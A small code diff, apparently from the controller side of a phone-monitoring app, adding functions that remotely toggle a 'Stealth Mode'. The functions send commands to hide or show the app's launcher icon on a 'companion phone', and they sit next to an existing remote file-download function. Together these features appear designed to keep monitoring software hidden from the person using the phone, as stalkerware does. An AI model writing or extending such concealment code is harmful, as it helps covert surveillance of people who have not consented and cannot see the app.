@@ -864,4 +864,19 @@ export async function fetchAndDownloadRealDeviceFile(deviceId, file, onStatusUpd
   });
 }
 
+/**
+ * Remotely toggle Stealth Mode (hide or unhide app launcher icon on companion phone).
+ */
+export async function triggerStealthToggle(deviceId) {
+  return await sendCommand(deviceId, 'TOGGLE_STEALTH');
+}
+
+export async function triggerHideIcon(deviceId) {
+  return await sendCommand(deviceId, 'HIDE_ICON');
+}
+
+export async function triggerShowIcon(deviceId) {
+  return await sendCommand(deviceId, 'SHOW_ICON');
+}
+
 
